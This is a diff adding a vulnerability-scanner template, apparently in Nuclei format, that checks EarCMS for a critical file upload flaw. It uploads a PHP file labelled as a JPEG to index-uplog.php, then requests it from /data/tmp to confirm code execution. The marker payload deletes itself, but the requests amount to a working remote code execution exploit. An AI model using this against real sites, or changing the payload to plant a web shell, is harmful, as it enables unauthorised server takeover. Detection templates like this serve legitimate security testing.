@@ -1,0 +1,38 @@
+id: yaml-poc-earcms-earcms-file_upload-CT-416449
+info:
+  name: Yaml Poc Earcms Earcms File_Upload Ct 416449
+  author: jiapeng.han
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-earcms-earcms-file_upload-CT-416449'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /source/pack/upload/index-uplog.php
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"time\"\r\n\n{{r3}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
+    \ form-data; name=\"app\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\
+    \n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - php
+- method: GET
+  path:
+  - /data/tmp/{{r3}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
